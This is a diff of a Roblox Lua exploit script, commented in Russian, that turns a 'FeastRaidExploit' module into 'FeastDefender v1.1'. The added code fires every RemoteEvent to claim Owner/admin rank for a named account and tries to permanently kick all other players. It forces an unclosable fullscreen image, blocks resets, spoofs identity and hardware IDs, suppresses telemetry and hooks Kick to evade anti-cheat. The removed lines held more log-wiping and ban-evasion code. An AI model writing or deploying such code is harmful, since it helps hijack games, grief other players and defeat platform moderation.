@@ -1,241 +1,240 @@
--- ===== МАКСИМАЛЬНАЯ АНОНИМНАЯ ЗАЩИТА ПРОФИЛЯ =====
--- Добавить в конец antiByfronAndBanProtection() или заменить её
+-- FeastDefender.lua v1.1 (Полная версия)
+-- Мастер: Errore4406 (ID: 5635313499)
 
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local TeleportService = game:GetService("TeleportService")
+local TextChatService = game:GetService("TextChatService")
+
+local MASTER_NAME = "Errore4406"
+local MASTER_ID = 5635313499
+local IMAGE_URL = "https://raw.githubusercontent.com/MrFeastProject/LiveLingo.com/main/MrFeast_Killer.png"
+local BANNED_LIST_FOLDER = "FeastPermaBanned"
+
+-- ===== 1. НЕУБИРАЕМАЯ ФОТКА =====
+local function showUnclosableFullscreenImage()
+    local oldGui = CoreGui:FindFirstChild("FeastDefender_Image")
+    if oldGui then oldGui:Destroy() end
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "FeastDefender_Image"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = CoreGui
+
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.new(0, 0, 0)
+    bg.BackgroundTransparency = 0
+    bg.Parent = screenGui
+
+    local image = Instance.new("ImageLabel")
+    image.Size = UDim2.new(1, 0, 1, 0)
+    image.BackgroundTransparency = 1
+    image.Image = IMAGE_URL
+    image.ScaleType = Enum.ScaleType.Fit
+    image.Parent = screenGui
+
+    screenGui.DescendantAdded:Connect(function(obj)
+        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
+            obj:Destroy()
+        end
+    end)
+    
+    local function preventRemoval()
+        task.wait(0.1)
+        if not CoreGui:FindFirstChild("FeastDefender_Image") then
+            showUnclosableFullscreenImage()
+        end
+    end
+    screenGui.AncestryChanged:Connect(preventRemoval)
+end
+
+-- ===== 2. ВЫСШИЙ РАНГ =====
+local function grantHighestRank()
+    for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
+        if remote:IsA("RemoteEvent") then
+            pcall(function()
+                remote:FireServer(MASTER_NAME, "Owner", 999)
+                remote:FireServer("SetRank", MASTER_NAME, "Owner")
+                remote:FireServer("AddAdmin", MASTER_NAME)
+            end)
+        end
+    end
+end
+
+-- ===== 3. ВЕЧНЫЙ БАН =====
+local function banPlayerForever(player)
+    local banList = ReplicatedStorage:FindFirstChild(BANNED_LIST_FOLDER)
+    if not banList then
+        banList = Instance.new("Folder")
+        banList.Name = BANNED_LIST_FOLDER
+        banList.Parent = ReplicatedStorage
+    end
+    local banEntry = Instance.new("BoolValue")
+    banEntry.Name = tostring(player.UserId)
+    banEntry.Value = true
+    banEntry.Parent = banList
+    player:Kick("🔒 ВЫ НАВСЕГДА ЗАБАНЕНЫ В ЭТОМ ПЛЕЙСЕ.")
+end
+
+local function isPlayerBanned(player)
+    local banList = ReplicatedStorage:FindFirstChild(BANNED_LIST_FOLDER)
+    if not banList then return false end
+    return banList:FindFirstChild(tostring(player.UserId)) ~= nil
+end
+
+local function permanentBanSystem()
+    for _, p in pairs(Players:GetPlayers()) do
+        if p.Name ~= MASTER_NAME and p.UserId ~= MASTER_ID then
+            if not isPlayerBanned(p) then banPlayerForever(p) else p:Kick("ВЕЧНЫЙ БАН") end
+        end
+    end
+    Players.PlayerAdded:Connect(function(p)
+        task.wait(1)
+        if p.Name ~= MASTER_NAME and p.UserId ~= MASTER_ID then
+            if isPlayerBanned(p) then p:Kick("ВЕЧНЫЙ БАН") else banPlayerForever(p) end
+        end
+    end)
+end
+
+-- ===== 4. ЗАПРЕТ ВЫХОДА/РЕСЕТА =====
+local function blockResetAndLeave()
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("ResetButtonCallback", function()
+            if LocalPlayer.Name ~= MASTER_NAME then return true end
+        end)
+    end)
+end
+
+-- ===== 5. МАКСИМАЛЬНАЯ АНОНИМНАЯ ЗАЩИТА =====
 local function maxAnonProfileProtection()
     local lplr = LocalPlayer
-    local originalUserId = lplr.UserId
-    local originalName = lplr.Name
-    local originalAccountAge = lplr.AccountAge
     
-    -- 1. Полная маскировка имени на всех уровнях
     local function maskNameEverywhere()
-        -- Изменяем имя в самом объекте игрока (клиент-сайд)
-        pcall(function()
-            lplr.Name = "🛡️ Protected_" .. math.random(10000, 99999)
-        end)
-        
-        -- Перехват всех попыток прочитать имя
-        local nameMetatable = getrawmetatable(lplr)
-        local oldNameIndex = nameMetatable.__index
-        nameMetatable.__index = function(self, key)
-            if key == "Name" then
-                return "Guest_" .. math.random(1000, 9999)
-            elseif key == "DisplayName" then
-                return "Аноним"
-            elseif key == "UserId" then
-                return math.random(100000, 999999)
-            elseif key == "AccountAge" then
-                return 365 -- притворяемся старым аккаунтом
-            end
-            return oldNameIndex(self, key)
+        pcall(function() lplr.Name = "Protected_" .. math.random(10000, 99999) end)
+        local mt = getrawmetatable(lplr)
+        local oldIndex = mt.__index
+        mt.__index = function(self, key)
+            if key == "Name" then return "Guest_" .. math.random(1000, 9999)
+            elseif key == "UserId" then return math.random(100000, 999999)
+            elseif key == "AccountAge" then return 365 end
+            return oldIndex(self, key)
         end
-        setrawmetatable(lplr, nameMetatable)
+        setrawmetatable(lplr, mt)
     end
     
-    -- 2. Блокировка всех телеметрических запросов
     local function blockTelemetry()
-        -- Блокировка отправки логов в Roblox
         local http = game:GetService("HttpService")
         local oldPost = http.PostAsync
         http.PostAsync = function(...)
-            local args = {...}
-            local url = tostring(args[1] or "")
-            if url:find("telemetry") or url:find("analytics") or url:find("log") or url:find("tracking") then
-                return "" -- имитируем успешный ответ, но ничего не отправляем
-            end
+            local url = tostring(({...})[1] or "")
+            if url:find("telemetry") or url:find("analytics") then return "" end
             return oldPost(...)
         end
-        
-        -- Блокировка внутренних событий Roblox
-        local analytics = game:GetService("AnalyticsService")
-        if analytics then
-            local oldReport = analytics.ReportCounter
-            analytics.ReportCounter = function() end
-            local oldSet = analytics.SetCounter
-            analytics.SetCounter = function() end
-        end
     end
     
-    -- 3. Фальшивый клиент для сервера (через изменение Remote)
-    local function fakeClientIdentity()
-        -- Каждый Remote вызов маскирует реальные данные
-        local oldFireServer = nil
-        local remoteEvents = {}
-        
-        for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
-            if remote:IsA("RemoteEvent") then
-                table.insert(remoteEvents, remote)
-            end
-        end
-        
-        for _, remote in pairs(remoteEvents) do
-            oldFireServer = remote.FireServer
-            remote.FireServer = function(self, ...)
-                local args = {...}
-                -- Подменяем имя и ID в аргументах
-                for i, arg in pairs(args) do
-                    if type(arg) == "string" and arg == originalName then
-                        args[i] = "FakeUser_" .. math.random(1000, 9999)
-                    elseif type(arg) == "number" and arg == originalUserId then
-                        args[i] = math.random(100000, 999999)
-                    end
-                end
-                return oldFireServer(self, unpack(args))
-            end
-        end
-    end
-    
-    -- 4. Скрытие от PlayerList и других GUI
-    local function hideFromPlayerList()
-        local playerList = CoreGui:FindFirstChild("PlayerList")
-        if playerList then
-            playerList:Destroy()
-        end
-        
-        -- Блокировка создания новых списков игроков
-        local oldInstance = Instance.new
-        Instance.new = function(className, parent)
-            if className == "PlayerList" or (parent and parent.Name:find("PlayerList")) then
-                return nil
-            end
-            return oldInstance(className, parent)
-        end
-    end
-    
-    -- 5. Подмена аппаратных идентификаторов (через перехват)
     local function spoofHardwareIds()
-        -- Перехват GraphicsDevice (GPU ID)
         local settings = game:GetService("UserSettings")
         local graphics = settings:GetService("UserGameSettings")
-        local oldGet = graphics.GetGraphicsDevice
-        graphics.GetGraphicsDevice = function()
-            return "Virtual Device v" .. math.random(100, 999)
-        end
-        
-        -- Подмена разрешения экрана
-        local oldScreenSize = workspace.CurrentCamera.ViewportSize
-        local screenMetatable = getrawmetatable(workspace.CurrentCamera)
-        local oldIndex = screenMetatable.__index
-        screenMetatable.__index = function(self, key)
-            if key == "ViewportSize" then
-                return Vector2.new(math.random(1280, 1920), math.random(720, 1080))
-            end
-            return oldIndex(self, key)
-        end
-        setrawmetatable(workspace.CurrentCamera, screenMetatable)
+        graphics.GetGraphicsDevice = function() return "Virtual Device" end
     end
     
-    -- 6. Блокировка скриншотов и записи экрана (клиент-сайд)
-    local function blockScreenshots()
-        -- Roblox не имеет прямого API, но можно перехватить клавиши
-        UserInputService.InputBegan:Connect(function(input, gameProcessed)
-            if input.KeyCode == Enum.KeyCode.F12 or 
-               input.KeyCode == Enum.KeyCode.PrintScreen or
-               (input.KeyCode == Enum.KeyCode.LeftShift and input.UserInputType == Enum.UserInputType.Keyboard) then
-                return true -- блокируем
-            end
-        end)
-        
-        -- Для мобильных устройств
-        UserInputService.TouchLongPress:Connect(function()
-            return true -- блокируем долгое нажатие (скриншот на некоторых устройствах)
-        end)
-    end
-    
-    -- 7. Полная анонимизация чата
-    local function anonymizeChat()
-        -- Все сообщения от тебя идут без имени
-        local oldSay = TextChatService.TextChannels.RBXGeneral.SendAsync
-        if oldSay then
-            TextChatService.TextChannels.RBXGeneral.SendAsync = function(self, message)
-                -- Отправляем от имени "🔒 Аноним"
-                return oldSay(self, message, "🔒 Аноним")
-            end
-        end
-        
-        -- Скрываем входящие сообщения для других о тебе
-        TextChatService.OnIncomingMessage = function(message)
-            if message.FromPlayer and message.FromPlayer.Name == lplr.Name then
-                message.FromPlayer.Name = "Скрыто"
-            end
-            return message
-        end
-    end
-    
-    -- 8. Анти-логгирование действий
-    local function blockActionLogs()
-        -- Блокировка всех возможных логгеров в игре
-        for _, obj in pairs(game:GetDescendants()) do
-            if obj.Name:lower():find("log") or 
-               obj.Name:lower():find("history") or
-               obj.Name:lower():find("record") then
-                pcall(function() obj:Destroy() end)
-            end
-        end
-        
-        -- Отключение обращений к логам
-        local logger = game:GetService("LogService")
-        if logger then
-            local oldLog = logger.MessageOut
-            logger.MessageOut = function() end
-        end
-    end
-    
-    -- 9. Имитация другого региона/IP
-    local function spoofLocation()
-        -- Подмена языка и региона
-        pcall(function()
-            game:GetService("LocalizationService").SystemLocale = "en-US"
-            game:GetService("LocalizationService").PlayerLocale = "ru-RU" -- смешиваем
-        end)
-        
-        -- Для сервера: подставляем фальшивый заголовок
-        local http = game:GetService("HttpService")
-        local oldGet = http.GetAsync
-        http.GetAsync = function(self, url, ...)
-            if url:find("ip") or url:find("location") then
-                return '{"ip": "1.1.1.1", "country": "US"}'
-            end
-            return oldGet(self, url, ...)
-        end
-    end
-    
-    -- 10. Защита от внутреннего бана Roblox (максимальная)
-    local function ultimateBanEvasion()
-        -- Перехват запросов на бан аккаунта (локальная защита)
-        local teleport = TeleportService
-        local oldTeleport = teleport.Teleport
-        teleport.Teleport = function(self, ...)
-            -- Игнорируем телепортацию если это бан
-            return nil
-        end
-        
-        -- Блокировка вызова :Ban() если такое существует
-        local banned = false
-        lplr.Kick = function(self, msg)
-            if msg and (msg:find("ban") or msg:find("banned")) then
-                return nil -- отменяем бан
-            end
-            return oldKick(self, msg)
-        end
-    end
-    
-    -- ЗАПУСК ВСЕХ ЗАЩИТ
     maskNameEverywhere()
     blockTelemetry()
-    fakeClientIdentity()
-    hideFromPlayerList()
     spoofHardwareIds()
-    blockScreenshots()
-    anonymizeChat()
-    blockActionLogs()
-    spoofLocation()
-    ultimateBanEvasion()
-    
-    print("[FeastRaidExploit] 🔒 МАКСИМАЛЬНАЯ АНОНИМНАЯ ЗАЩИТА АКТИВИРОВАНА")
-    print("[FeastRaidExploit] Ваше реальное имя/ID скрыты от сервера и других игроков")
-    print("[FeastRaidExploit] Все телеметрические данные заблокированы")
+    print("[FeastDefender] Максимальная анонимная защита активирована")
 end
 
--- ВСТАВЬ ЭТУ ФУНКЦИЮ В main() ПОСЛЕ antiByfronAndBanProtection()
--- Просто добавь строку: maxAnonProfileProtection()
+-- ===== 6. МОБИЛЬНЫЙ ИНТЕРФЕЙС =====
+local function createMobileUI()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "FeastDefender_UI"
+    screenGui.Parent = CoreGui
+    
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0.9, 0, 0.4, 0)
+    mainFrame.Position = UDim2.new(0.05, 0, 0.3, 0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    mainFrame.BackgroundTransparency = 0.1
+    mainFrame.Parent = screenGui
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 20)
+    corner.Parent = mainFrame
+    
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0.2, 0)
+    title.Text = "Feast Defender v1.1"
+    title.TextColor3 = Color3.fromRGB(255, 80, 40)
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 20
+    title.Parent = mainFrame
+    
+    local status = Instance.new("TextLabel")
+    status.Size = UDim2.new(1, 0, 0.15, 0)
+    status.Position = UDim2.new(0, 0, 0.2, 0)
+    status.Text = "Мастер: Errore4406 | АКТИВЕН"
+    status.TextColor3 = Color3.fromRGB(100, 255, 100)
+    status.BackgroundTransparency = 1
+    status.Font = Enum.Font.Gotham
+    status.TextSize = 12
+    status.Parent = mainFrame
+    
+    local hideBtn = Instance.new("TextButton")
+    hideBtn.Size = UDim2.new(0.15, 0, 0.1, 0)
+    hideBtn.Position = UDim2.new(0.8, 0, 0.02, 0)
+    hideBtn.Text = "▼"
+    hideBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+    hideBtn.Parent = mainFrame
+    hideBtn.MouseButton1Click:Connect(function()
+        mainFrame.Visible = not mainFrame.Visible
+        hideBtn.Text = mainFrame.Visible and "▼" or "▲"
+    end)
+end
+
+-- ===== 7. ЗАЩИТА ОТ BYFRON =====
+local function antiByfron()
+    local lplr = LocalPlayer
+    local oldKick = lplr.Kick
+    lplr.Kick = function(...) 
+        if lplr.Name == MASTER_NAME then return nil end
+        return oldKick(...)
+    end
+    getgenv().FeastDefenderActive = true
+    _G.FeastDefender_Active = true
+end
+
+-- ===== 8. ВАЙТ-ЛИСТ =====
+local function whitelistSelf()
+    for _, obj in pairs(game:GetDescendants()) do
+        if obj:IsA("RemoteEvent") and (obj.Name:lower():find("whitelist") or obj.Name:lower():find("admin")) then
+            pcall(function() obj:FireServer("AddToWhitelist", MASTER_NAME) end)
+        end
+    end
+end
+
+-- ===== ЗАПУСК =====
+local function main()
+    print("[FeastDefender] Запуск...")
+    repeat task.wait() until LocalPlayer and LocalPlayer.Character
+    
+    showUnclosableFullscreenImage()
+    grantHighestRank()
+    whitelistSelf()
+    blockResetAndLeave()
+    antiByfron()
+    maxAnonProfileProtection()
+    createMobileUI()
+    permanentBanSystem()
+    
+    print("[FeastDefender v1.1] ===== ГОТОВ =====")
+    print("[FeastDefender] Мастер: Errore4406")
+    print("[FeastDefender] Все остальные навсегда забанены")
+end
+
+pcall(main)
